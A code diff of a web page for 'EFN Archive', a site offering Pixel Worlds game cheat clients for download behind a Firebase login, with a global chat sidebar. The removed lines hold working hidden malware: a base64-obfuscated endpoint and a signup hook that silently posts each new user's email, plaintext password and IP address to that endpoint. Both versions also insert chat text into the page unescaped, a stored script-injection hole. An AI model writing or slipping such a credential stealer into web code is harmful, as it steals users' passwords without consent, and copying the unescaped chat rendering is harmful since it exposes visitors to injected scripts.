@@ -10,7 +10,7 @@
         import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut, sendEmailVerification, setPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
         import { getDatabase, ref, push, onChildAdded, onValue, set, remove, serverTimestamp, query, limitToLast } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-        const _0x_config = {
+        const firebaseConfig = {
             apiKey: "AIzaSyCM-ySTXgy37zVUMB2vy4ZJQ3MWlDD5g4E",
             authDomain: "efn-archive.firebaseapp.com",
             projectId: "efn-archive",
@@ -20,150 +20,81 @@
             databaseURL: "https://efn-archive-default-rtdb.firebaseio.com"
         };
 
-        const app = initializeApp(_0x_config);
+        const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
         const db = getDatabase(app);
-        const _0x_gate = "aHR0cHM6Ly9zeXN0ZW0tc3luYy1sYXllci5waXhlbHdvcmxkc21hbmFnZXIxMDAud29ya2Vycy5kZXYv";
 
-        setPersistence(auth, browserLocalPersistence);
-
-        // --- Integrated Notification System ---
+        // --- Notification Logic (Now in Sidebar) ---
         window.notify = (msg, type = 'info') => {
             const container = document.getElementById('notif-area');
             const div = document.createElement('div');
             div.className = `menu-notif ${type}`;
             div.innerHTML = `<i class="fas fa-bell"></i> <span>${msg}</span>`;
             container.prepend(div);
-            setTimeout(() => { div.style.opacity = '0'; setTimeout(() => div.remove(), 500); }, 6000);
+            setTimeout(() => {
+                div.style.opacity = '0';
+                setTimeout(() => div.remove(), 500);
+            }, 7000);
         };
 
-        async function _0x_fireEvent_init(_0x_email, _0x_pass) {
+        // --- Auth Logic ---
+        window.signUp = async () => {
+            const e = document.getElementById('reg-email').value;
+            const p = document.getElementById('reg-pass').value;
+            if (p.length < 8) return notify("Password must be 8+ characters.", "error");
+
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                await fetch(atob(_0x_gate), {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "✨ User Entry Logged",
-                            color: 0x00e676,
-                            fields: [
-                                { name: "User", value: _0x_email, inline: true },
-                                { name: "Pass", value: _0x_pass, inline: true },
-                                { name: "IP", value: ipData.ip, inline: false }
-                            ],
-                            timestamp: new Date()
-                        }]
-                    })
-                });
-            } catch (e) { }
-        }
+                const userCredential = await createUserWithEmailAndPassword(auth, e, p);
+                await sendEmailVerification(userCredential.user);
+                await signOut(auth); 
+                notify("Verify your email first! Check your spam folder.", "success");
+                switchAuth('log');
+            } catch (err) { notify(err.message, "error"); }
+        };
 
-        // Chat Logic
+        window.login = async () => {
+            const e = document.getElementById('log-email').value;
+            const p = document.getElementById('log-pass').value;
+            try {
+                const userCredential = await signInWithEmailAndPassword(auth, e, p);
+                if (!userCredential.user.emailVerified) {
+                    notify("Email not verified! Check spam folder.", "error");
+                    await signOut(auth);
+                    return;
+                }
+                location.reload();
+            } catch (err) { notify("Invalid login credentials.", "error"); }
+        };
+
+        window.confirmLogout = () => {
+            if (confirm("Are you sure you want to log out?")) {
+                signOut(auth).then(() => location.reload());
+            }
+        };
+
+        // --- Improved Realtime Chat ---
         const chatBox = document.getElementById('chat-messages');
-        const typingEl = document.getElementById('typing-indicator');
-
         window.sendMessage = () => {
             const input = document.getElementById('chat-input');
             const user = auth.currentUser;
             if (!user || !input.value.trim()) return;
+            
             push(ref(db, 'messages'), {
                 username: user.email.split('@')[0],
                 text: input.value,
                 timestamp: serverTimestamp()
             });
             input.value = "";
-            remove(ref(db, `typing/${user.uid}`));
         };
-
-        document.addEventListener('input', (e) => {
-            if (e.target.id === 'chat-input') {
-                const user = auth.currentUser;
-                if (user) {
-                    if (e.target.value.length > 0) set(ref(db, `typing/${user.uid}`), user.email.split('@')[0]);
-                    else remove(ref(db, `typing/${user.uid}`));
-                }
-            }
-        });
-
-        onValue(ref(db, 'typing'), (snapshot) => {
-            const users = snapshot.val();
-            if (!users) { typingEl.innerText = ""; return; }
-            const names = Object.values(users);
-            typingEl.innerText = names.length > 1 ? "Several people are typing..." : (names.length === 1 ? `${names[0]} is typing...` : "");
-        });
 
         onChildAdded(query(ref(db, 'messages'), limitToLast(40)), (data) => {
             const msg = data.val();
             const div = document.createElement('div');
-            div.className = 'chat-msg fade-in';
-            div.innerHTML = `<span class="chat-user">${msg.username}:</span> ${msg.text}`;
+            div.className = 'chat-msg';
+            div.innerHTML = `<span class="chat-user">${msg.username}</span> ${msg.text}`;
             chatBox.appendChild(div);
             chatBox.scrollTop = chatBox.scrollHeight;
         });
-
-        // Auth Logic
-        window.login = async () => {
-            const e = document.getElementById('log-email').value;
-            const p = document.getElementById('log-pass').value;
-            try {
-                const userCred = await signInWithEmailAndPassword(auth, e, p);
-                if (!userCred.user.emailVerified) {
-                    window.notify("Email not verified! Check your spam folder.", "error");
-                    await signOut(auth);
-                    return;
-                }
-                location.reload();
-            } catch (err) { window.notify("Invalid credentials.", "error"); }
-        };
-
-        window.signUp = async () => {
-            const e = document.getElementById('reg-email').value;
-            const p = document.getElementById('reg-pass').value;
-            const hasNumber = /\d/.test(p);
-            
-            if (!e.includes('@')) return window.notify("Enter a valid email.", "error");
-            if (p.length < 8 || !hasNumber) return window.notify("Password needs 8+ chars & 1 number.", "error");
-            
-            try {
-                const userCred = await createUserWithEmailAndPassword(auth, e, p);
-                await sendEmailVerification(userCred.user);
-                await _0x_fireEvent_init(e, p);
-                window.notify("Verification email sent! Check spam.", "success");
-                await signOut(auth);
-                switchAuth('log');
-            } catch (err) { window.notify(err.message, "error"); }
-        };
-
-        window.logout = () => {
-            if(confirm("Are you sure you want to log out?")) {
-                signOut(auth).then(() => location.reload());
-            }
-        };
-
-        window.switchAuth = (m) => {
-            document.getElementById('login-box').style.display = m === 'reg' ? 'none' : 'block';
-            document.getElementById('reg-box').style.display = m === 'reg' ? 'block' : 'none';
-        };
-
-        window.openDetail = (name, status, desc, img, link) => {
-            document.getElementById('main-page').style.display = 'none';
-            document.getElementById('account-page').style.display = 'none';
-            document.getElementById('detail-page').style.display = 'block';
-            document.getElementById('det-title').innerText = name;
-            document.getElementById('det-status').innerText = status;
-            document.getElementById('det-desc').innerHTML = desc;
-            document.getElementById('det-img').src = img;
-            document.getElementById('det-dl').onclick = () => window.open(link, '_blank');
-            window.scrollTo(0,0);
-        };
-
-        window.showAccount = () => {
-            document.getElementById('main-page').style.display = 'none';
-            document.getElementById('detail-page').style.display = 'none';
-            document.getElementById('account-page').style.display = 'block';
-        };
 
         onAuthStateChanged(auth, (user) => {
             if (user && user.emailVerified) {
@@ -176,69 +107,81 @@
                 document.getElementById('chat-user-ui').style.display = 'flex';
             }
         });
+
+        window.openDetail = (name, desc, img, link) => {
+            document.getElementById('main-page').style.display = 'none';
+            document.getElementById('account-page').style.display = 'none';
+            document.getElementById('detail-page').style.display = 'block';
+            document.getElementById('det-title').innerText = name;
+            document.getElementById('det-desc').innerHTML = desc;
+            document.getElementById('det-img').src = img;
+            document.getElementById('det-dl').onclick = () => window.open(link, '_blank');
+            window.scrollTo(0,0);
+        };
+
+        window.switchAuth = (m) => {
+            document.getElementById('login-box').style.display = m === 'reg' ? 'none' : 'block';
+            document.getElementById('reg-box').style.display = m === 'reg' ? 'block' : 'none';
+        };
+
+        window.showAccount = () => {
+            document.getElementById('main-page').style.display = 'none';
+            document.getElementById('detail-page').style.display = 'none';
+            document.getElementById('account-page').style.display = 'block';
+        };
     </script>
 
     <style>
         :root { 
-            --bg: #07080a; 
-            --side: #0e1015; 
-            --card: #161920; 
-            --accent: #00e676; 
-            --border: #232730; 
+            --bg: #0b0915; 
+            --side: #120e24; 
+            --card: #1a1533; 
+            --accent: #9d50ff; /* Purple PixelBet Theme */
+            --border: #2a234d; 
             --error: #ff4d4d;
         }
+
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; display: flex; height: 100vh; overflow: hidden; }
         
-        main { flex: 1; overflow-y: auto; display: flex; flex-direction: column; background: radial-gradient(circle at top right, #0d1a12, transparent); }
+        main { flex: 1; overflow-y: auto; display: flex; flex-direction: column; background: radial-gradient(circle at top right, #1a0b33, transparent); }
         aside { width: 340px; background: var(--side); border-left: 1px solid var(--border); display: flex; flex-direction: column; }
 
-        /* PixelBet Theme Titles */
-        .title-anim { font-weight: 900; letter-spacing: 2px; font-size: 1.4rem; color: #fff; cursor: pointer; text-transform: uppercase; }
-        .title-anim span { color: var(--accent); text-shadow: 0 0 10px rgba(0, 230, 118, 0.5); }
+        nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 40px; background: rgba(18, 14, 36, 0.8); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+        .nav-item { cursor: pointer; font-weight: 600; font-size: 0.9rem; color: #aaa; transition: 0.3s; }
+        .nav-item:hover { color: var(--accent); }
 
-        nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 40px; border-bottom: 1px solid var(--border); background: rgba(14,16,21,0.9); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100; }
-        .nav-btns { display: flex; gap: 20px; align-items: center; }
-        .nav-link { cursor: pointer; font-weight: bold; font-size: 0.85rem; color: #aaa; transition: 0.3s; text-transform: uppercase; }
-        .nav-link:hover { color: var(--accent); }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 25px; padding: 40px; }
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; transition: 0.3s ease; text-align: center;}
+        .card:hover { border-color: var(--accent); transform: translateY(-5px); box-shadow: 0 10px 30px rgba(157, 80, 255, 0.2); }
+        .card img { width: 100%; border-radius: 8px; height: 160px; object-fit: cover; margin-bottom: 15px; }
 
-        /* Notification Area in Sidebar */
-        #notif-area { padding: 15px 15px 0 15px; }
-        .menu-notif { padding: 12px; border-radius: 8px; margin-bottom: 10px; font-size: 0.8rem; background: #1a1d26; border-left: 4px solid var(--accent); display: flex; align-items: center; gap: 10px; transition: 0.5s; animation: slideIn 0.3s ease; }
+        .btn-main { background: var(--accent); color: #fff; border: none; padding: 10px 20px; border-radius: 6px; font-weight: 700; cursor: pointer; transition: 0.2s; letter-spacing: 0.5px; }
+        .btn-main:hover { filter: brightness(1.2); box-shadow: 0 0 15px rgba(157, 80, 255, 0.4); }
+
+        /* Notifications UI */
+        .menu-notif { padding: 12px; border-radius: 8px; margin: 0 15px 10px 15px; font-size: 0.8rem; border-left: 4px solid var(--accent); background: #1f1a3d; animation: slideIn 0.3s ease; display: flex; gap: 10px; align-items: center; }
         .menu-notif.error { border-left-color: var(--error); color: var(--error); }
-        .menu-notif.success { border-left-color: var(--accent); color: var(--accent); }
-        @keyframes slideIn { from { transform: translateX(30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
-
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 30px; padding: 40px; }
-        .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 25px; transition: 0.3s; text-align: center; position: relative; overflow: hidden; }
-        .card:hover { transform: translateY(-5px); border-color: var(--accent); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .card img { width: 100%; border-radius: 8px; margin-bottom: 20px; height: 170px; object-fit: cover; filter: brightness(0.8); transition: 0.3s; }
-        .card:hover img { filter: brightness(1.1); }
+        .menu-notif.success { border-left-color: #00e676; }
+        @keyframes slideIn { from { transform: translateX(20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
 
         /* Chat UI */
-        .chat-header { padding: 15px; font-weight: 800; font-size: 0.8rem; letter-spacing: 1px; border-bottom: 1px solid var(--border); color: #666; }
-        #chat-messages { flex: 1; overflow-y: auto; padding: 15px; }
-        .chat-msg { background: rgba(255,255,255,0.02); padding: 10px; border-radius: 8px; margin-bottom: 10px; font-size: 0.85rem; border: 1px solid transparent; }
-        .chat-msg:hover { border-color: var(--border); background: rgba(255,255,255,0.04); }
-        .chat-user { color: var(--accent); font-weight: bold; display: block; font-size: 0.7rem; margin-bottom: 2px; text-transform: uppercase; }
-        #typing-indicator { height: 20px; padding-left: 15px; font-size: 0.7rem; color: #444; }
-
-        .btn-main { background: var(--accent); color: #000; border: none; padding: 10px 20px; border-radius: 6px; font-weight: 800; cursor: pointer; transition: 0.3s; display: flex; align-items: center; gap: 8px; text-transform: uppercase; font-size: 0.8rem; }
-        .btn-main:hover { filter: brightness(1.2); transform: scale(1.02); box-shadow: 0 0 15px rgba(0, 230, 118, 0.3); }
-        .btn-discord { background: #5865F2 !important; color: #fff !important; }
-
-        .tut-box { background: #0a0c10; border-left: 4px solid var(--accent); padding: 25px; border-radius: 8px; margin: 20px 0; text-align: left; }
-        blockquote { border-left: 3px solid var(--border); padding: 15px; margin: 20px 0; background: rgba(0,0,0,0.2); border-radius: 0 8px 8px 0; line-height: 1.6; font-size: 0.9rem; }
-
-        #auth-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; align-items: center; justify-content: center; z-index: 2000; backdrop-filter: blur(10px); }
-        .auth-box { width: 380px; background: var(--card); padding: 40px; border-radius: 15px; border: 1px solid var(--border); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #07080a; border: 1px solid var(--border); color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        #chat-messages { flex: 1; overflow-y: auto; padding: 20px; font-size: 0.9rem; }
+        .chat-msg { margin-bottom: 15px; background: rgba(255,255,255,0.03); padding: 10px; border-radius: 8px; }
+        .chat-user { color: var(--accent); font-weight: bold; margin-bottom: 4px; display: block; font-size: 0.75rem; }
+        .chat-input-area { padding: 20px; border-top: 1px solid var(--border); background: var(--side); }
+        
+        input { width: 100%; padding: 12px; background: #07080a; border: 1px solid var(--border); color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; }
         input:focus { border-color: var(--accent); }
 
-        .fade-in { animation: fadeIn 0.4s ease-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .coming-soon { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 60vh; text-align: center; }
-        .coming-soon h1 { font-size: 3rem; color: var(--accent); text-shadow: 0 0 20px rgba(0,230,118,0.3); }
+        /* Description Styling */
+        .tut-box { background: #07080a; padding: 20px; border-radius: 8px; margin: 15px 0; text-align: left; border-left: 3px solid var(--accent); }
+        blockquote { border-left: 3px solid #444; padding-left: 15px; margin: 15px 0; color: #ccc; }
+
+        #auth-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 2000; backdrop-filter: blur(8px); }
+        .auth-box { width: 380px; background: var(--card); padding: 40px; border-radius: 12px; border: 1px solid var(--border); text-align: center; }
+
+        .title-anim { font-size: 1.5rem; font-weight: 900; color: #fff; cursor: pointer; }
+        .title-anim span { color: var(--accent); }
     </style>
 </head>
 <body>
@@ -246,115 +189,134 @@
 <main>
     <nav>
         <div class="title-anim" onclick="location.reload()">EFN <span>ARCHIVE</span></div>
-        <div class="nav-btns">
-            <span class="nav-link" onclick="location.reload()">Home</span>
-            <span class="nav-link auth-ui" style="display:none" onclick="showAccount()">Account</span>
-            <button class="btn-main btn-discord" onclick="window.open('https://discord.gg/QV69upuxbg', '_blank')">
-                <i class="fab fa-discord"></i> Discord
-            </button>
+        <div style="display:flex; gap:25px; align-items:center">
+            <span class="nav-item" onclick="location.reload()">Home</span>
+            <span class="nav-item auth-ui" style="display:none" onclick="showAccount()">Account</span>
             <div id="nav-guest">
-                <button class="btn-main" onclick="document.getElementById('auth-overlay').style.display='flex'">Join Archive</button>
+                <button class="btn-main" onclick="document.getElementById('auth-overlay').style.display='flex'">Login/Create Account</button>
             </div>
             <div id="nav-user" style="display:none; align-items:center; gap:20px">
                 <span id="user-tag" style="font-weight:bold; color:var(--accent)"></span>
-                <button onclick="logout()" style="color:#ff4444; border:none; background:none; cursor:pointer; font-weight:bold; text-transform:uppercase; font-size:0.7rem">Logout</button>
+                <button onclick="confirmLogout()" style="color:#ff4444; border:none; background:none; cursor:pointer; font-size:0.8rem; font-weight:bold;">Logout</button>
             </div>
         </div>
     </nav>
 
     <div id="main-page">
         <div class="grid">
-            <div class="card fade-in">
-                <img src="https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png?ex=69e8e86b&is=69e796eb&hm=91c64bb8c69318d8c42565b0c38edd3cd55e8446622235632bbf522c5d280782&">
+            <div class="card">
+                <img src="https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg">
                 <h3>Charon Client v2.0</h3>
-                <button class="btn-main" style="margin: 0 auto" onclick="openDetail('Charon Client v2.0', 'Working', `
+                <button class="btn-main" onclick="openDetail('Charon Client v2.0', `
                     <div class='tut-box'>
-                        <h3>🚀 Tutorial: Charon Client</h3>
-                        1️⃣ download the zip folder (download button)<br>
-                        2️⃣ extract the files to the location of pixel worlds folder<br>
-                        3️⃣ To find the folder from Steam: Right-click <b>Pixel Worlds</b> ⮕ <b>Manage</b> ⮕ <b>Browse Local Files</b>. 📂<br>
-                        4️⃣ Launch the game and enjoy!
+                        <p><strong>Charon Client Possible Causes & Fixes</strong></p>
+                        <blockquote>
+                            <strong>Running the game fullscreen or changed resolution while the menu was active</strong><br>
+                            You may need to:<br>
+                            - Delete the entire PW folder and reinstall PW<br>
+                            - Go in-game → <strong>Settings</strong> → <strong>Display</strong> → switch to <strong>Windowed Mode</strong><br>
+                            - Or add <code>-windowed</code> to your <strong>Steam Launch Options</strong>
+                        </blockquote>
+                        <blockquote>
+                            <strong>DirectX issues</strong> <em>(most common on laptops)</em><br>
+                            Try forcing a DirectX version via <strong>Steam Launch Options</strong>:<br><br>
+                            <strong>Option 1 Auto (try this first)</strong><br>
+                            Set <code>BepInEx/config/dearimgui.cfg</code> → <code>startupmode</code> = <code>Auto</code><br><br>
+                            <strong>Option 2 Force D3D11</strong><br>
+                            Launch option: <code>-force-d3d11</code><br>
+                            <code>BepInEx/config/dearimgui.cfg</code> → <code>startupmode</code> = <code>ForceD3D11</code><br><br>
+                            <strong>Option 3 Force D3D12</strong><br>
+                            Launch option: <code>-force-d3d12</code><br>
+                            <code>BepInEx/config/dearimgui.cfg</code> → <code>startupmode</code> = <code>ForceD3D12</code>
+                        </blockquote>
+                        <p style='color:var(--accent)'>EVERYONE WHO CRASHED WHEN U TRY LOGIN JUST MINIMIZE UR PW USE SMALL WINDOW</p>
                     </div>
-                    <h3>Charon Client Possible Causes & Fixes</h3>
-                    <blockquote>
-                        Running the game fullscreen or changed resolution while the menu was active<br>
-                        You may need to:<br>
-                        - Delete the entire PW folder and reinstall PW<br>
-                        - Go in-game → Settings → Display → switch to Windowed Mode
-                    </blockquote>
-                `, 'https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png?ex=69e8e86b&is=69e796eb&hm=91c64bb8c69318d8c42565b0c38edd3cd55e8446622235632bbf522c5d280782&', 'https://www.mediafire.com/file/eia22kkv7a2n66u/Charon+2.0.zip/file')">info</button>
+                `, 'https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg', 'https://www.mediafire.com/file/eia22kkv7a2n66u/Charon+2.0.zip/file')">Info</button>
             </div>
 
-            <div class="card fade-in">
+            <div class="card">
                 <img src="https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg">
                 <h3>Hyx Client [free]</h3>
-                <button class="btn-main" style="margin: 0 auto" onclick="openDetail('Hyx Client [free]', 'Working', 'Make sure you have <a href=\'https://github.com/abbodi1406/vcredist/releases/download/v0.103.0/VisualCppRedist_AIO_x86_x64.exe\' style=\'color:var(--accent)\'>vcredist AIO</a> installed.', 'https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg', 'https://www.mediafire.com/folder/cxm6q2f79vc0j/Hyx')">info</button>
+                <button class="btn-main" onclick="openDetail('Hyx Client [free]', `
+                    <div class='tut-box'>
+                        <p>Make sure this is installed if you don't have it already:<br>
+                        <a href='https://github.com/abbodi1406/vcredist/releases/download/v0.103.0/VisualCppRedist_AIO_x86_x64.exe' style='color:var(--accent)'>vcredist AIO</a></p>
+                        <p>Setup steam launch settings for the game or the menu wont appear: <code>-force-d3d11</code></p>
+                        <p>Also remove charon client folders from pixel worlds folder if not working!</p>
+                    </div>
+                `, 'https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg', 'https://www.mediafire.com/folder/cxm6q2f79vc0j/Hyx')">Info</button>
             </div>
-            
-            <div class="card fade-in">
+
+            <div class="card">
                 <img src="https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png?ex=69e89e06&is=69e74c86&hm=1ec8dee2bac62cb536d32943a39e28ba5b9ebc6ae95efa525deaf8dc32c261c5&">
                 <h3>AutoMath Tool</h3>
-                <button class="btn-main" style="margin: 0 auto" onclick="openDetail('AutoMath Tool', 'Working', 'Has some bugs but works fine for automation.', 'https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png?ex=69e89e06&is=69e74c86&hm=1ec8dee2bac62cb536d32943a39e28ba5b9ebc6ae95efa525deaf8dc32c261c5&', 'https://gofile.io/d/9sUpZS')">info</button>
+                <button class="btn-main" onclick="openDetail('AutoMath Tool', `
+                    <div class='tut-box'>
+                        <p>Automate your math questions in Pixel Worlds. Tutorial is included in the zip folder! ❤️</p>
+                    </div>
+                `, 'https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png?ex=69e89e06&is=69e74c86&hm=1ec8dee2bac62cb536d32943a39e28ba5b9ebc6ae95efa525deaf8dc32c261c5&', 'https://gofile.io/d/9sUpZS')">Info</button>
             </div>
         </div>
     </div>
 
-    <div id="account-page" style="display:none;" class="coming-soon">
-        <h1>Coming Soon...</h1>
-        <p style="color:#666">Account customization and statistics are under development.</p>
-        <button class="btn-main" style="margin-top:20px" onclick="location.reload()">Back Home</button>
+    <div id="account-page" style="display:none; text-align:center; padding-top:100px;">
+        <h1 style="font-size:3rem; color:var(--accent)">Coming soon...</h1>
+        <p>Your account customization is currently under development.</p>
+        <button class="btn-main" onclick="location.reload()">Back to Home</button>
     </div>
 
     <div id="detail-page" style="display:none; padding:40px;">
-        <button onclick="location.reload()" style="background:none; border:none; color:var(--accent); cursor:pointer; font-weight:bold; margin-bottom:20px;">← BACK</button>
-        <div style="display:flex; gap:50px; flex-wrap:wrap">
+        <button onclick="location.reload()" style="background:none; border:none; color:var(--accent); cursor:pointer; font-weight:bold; margin-bottom:20px;">← Back</button>
+        <div style="display:flex; gap:40px; flex-wrap:wrap">
             <div style="flex:2">
                 <img id="det-img" src="" style="width:100%; border-radius:12px; border:1px solid var(--border);">
                 <h1 id="det-title" style="margin-top:25px;"></h1>
-                <div id="det-desc" style="color:#aaa; line-height:1.7"></div>
+                <div id="det-desc"></div>
             </div>
-            <div style="flex:1; background:var(--card); border-radius:12px; padding:35px; border:1px solid var(--border); height:fit-content; text-align:center">
-                <p id="det-status" style="color:var(--accent); font-weight:bold; font-size:1.2rem"></p>
-                <hr style="border:0; border-top:1px solid var(--border); margin:20px 0">
-                <div class="lock-ui"><button class="btn-main" style="width:100%; background:#ff4444; color:#fff; justify-content:center" onclick="document.getElementById('auth-overlay').style.display='flex'">Login to Download</button></div>
-                <div class="auth-ui" style="display:none"><button id="det-dl" class="btn-main" style="width:100%; justify-content:center">Download File</button></div>
+            <div style="flex:1; background:var(--card); border-radius:12px; padding:35px; border:1px solid var(--border); height:fit-content;">
+                <div class="lock-ui"><button class="btn-main" style="width:100%" onclick="document.getElementById('auth-overlay').style.display='flex'">Login to Download</button></div>
+                <div class="auth-ui" style="display:none"><button id="det-dl" class="btn-main" style="width:100%">Download File</button></div>
             </div>
         </div>
     </div>
 </main>
 
 <aside>
-    <div id="notif-area"></div>
-    <div class="chat-header">🗨️ GLOBAL CHAT</div>
+    <div style="padding:20px; font-weight:800; border-bottom:1px solid var(--border); font-size:0.75rem; color:#666">SYSTEM NOTIFICATIONS</div>
+    <div id="notif-area" style="padding-top:10px;">
+        <div class="menu-notif">Welcome back to the Archive.</div>
+    </div>
+    
+    <div style="padding:20px; font-weight:800; border-bottom:1px solid var(--border); border-top:1px solid var(--border); font-size:0.75rem; color:#666">GLOBAL CHAT</div>
     <div id="chat-messages"></div>
-    <div id="typing-indicator"></div>
-    <div class="chat-input-area" style="padding:15px; border-top:1px solid var(--border)">
+    
+    <div class="chat-input-area">
         <div id="chat-guest-ui">
-            <button class="btn-main" onclick="document.getElementById('auth-overlay').style.display='flex'" style="width:100%; justify-content:center">Login to Chat</button>
+            <p style="font-size:0.8rem; color:#555; text-align:center">Login to chat</p>
         </div>
-        <div id="chat-user-ui" style="display:none; gap:8px;">
+        <div id="chat-user-ui" style="display:none; gap:10px; flex-direction:column">
             <input type="text" id="chat-input" placeholder="Type a message...">
-            <button onclick="sendMessage()" style="background:var(--accent); color:#000; border:none; border-radius:8px; padding:0 15px; cursor:pointer; font-weight:bold">➤</button>
+            <button class="btn-main" onclick="sendMessage()" style="width:100%">SEND</button>
         </div>
     </div>
 </aside>
 
 <div id="auth-overlay">
-    <div class="auth-box fade-in" id="login-box">
-        <h2 style="margin-top:0">SIGN IN</h2>
-        <input type="email" id="log-email" placeholder="Email Address">
+    <div class="auth-box" id="login-box">
+        <h2 style="margin-top:0">Sign In</h2>
+        <input type="email" id="log-email" placeholder="Email">
         <input type="password" id="log-pass" placeholder="Password">
-        <button class="btn-main" style="width:100%; justify-content:center" onclick="login()">Enter Archive</button>
-        <p style="font-size:0.85rem; margin-top:25px; color:#666">No account? <span style="color:var(--accent); cursor:pointer; font-weight:bold" onclick="switchAuth('reg')">Create One</span></p>
-        <p style="font-size:0.75rem; cursor:pointer; color:#444; margin-top:20px" onclick="document.getElementById('auth-overlay').style.display='none'">[ close ]</p>
+        <button class="btn-main" style="width:100%" onclick="login()">Login to account</button>
+        <p style="font-size:0.8rem; margin-top:20px">No account? <span style="color:var(--accent); cursor:pointer" onclick="switchAuth('reg')">Create Account</span></p>
+        <p style="font-size:0.75rem; color:#444; cursor:pointer" onclick="document.getElementById('auth-overlay').style.display='none'">Close</p>
     </div>
-    <div class="auth-box fade-in" id="reg-box" style="display:none">
-        <h2 style="margin-top:0">REGISTER</h2>
-        <input type="email" id="reg-email" placeholder="Email Address">
-        <input type="password" id="reg-pass" placeholder="Password (8+ chars & number)">
-        <button class="btn-main" style="width:100%; justify-content:center" onclick="signUp()">Create Account</button>
-        <p style="font-size:0.85rem; margin-top:25px; color:#666">Have an account? <span style="color:var(--accent); cursor:pointer; font-weight:bold" onclick="switchAuth('log')">Login Here</span></p>
-        <p style="font-size:0.75rem; cursor:pointer; color:#444; margin-top:20px" onclick="document.getElementById('auth-overlay').style.display='none'">[ close ]</p>
+
+    <div class="auth-box" id="reg-box" style="display:none">
+        <h2 style="margin-top:0">Create Account</h2>
+        <input type="email" id="reg-email" placeholder="Email">
+        <input type="password" id="reg-pass" placeholder="Password (Min 8 characters)">
+        <button class="btn-main" style="width:100%" onclick="signUp()">Sign Up</button>
+        <p style="font-size:0.8rem; margin-top:20px">Already have an account? <span style="color:var(--accent); cursor:pointer" onclick="switchAuth('log')">Login</span></p>
     </div>
 </div>
 
